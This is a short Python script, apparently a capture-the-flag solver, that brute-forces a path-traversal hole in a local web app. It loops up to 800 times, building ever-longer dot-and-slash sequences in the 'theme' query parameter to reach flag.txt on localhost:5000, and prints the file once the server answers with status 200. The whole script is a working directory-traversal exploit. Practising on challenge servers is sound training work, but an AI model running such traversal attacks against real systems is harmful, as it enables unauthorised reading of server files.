import requests
from tqdm import tqdm

funny_factorial = "../"
for _ in tqdm(range(800)):
    funny_factorial = "." + funny_factorial + "./"
    print(f"https://localhost:5000/?theme={funny_factorial}flag.txt")
    r = requests.get(f"http://localhost:5000/?theme={funny_factorial}flag.txt")

    # check if response code is 200
    if r.status_code == 200:
        print(r.text)
        break
    else:
        print(f"Response code: {r.status_code}")

print(funny_factorial)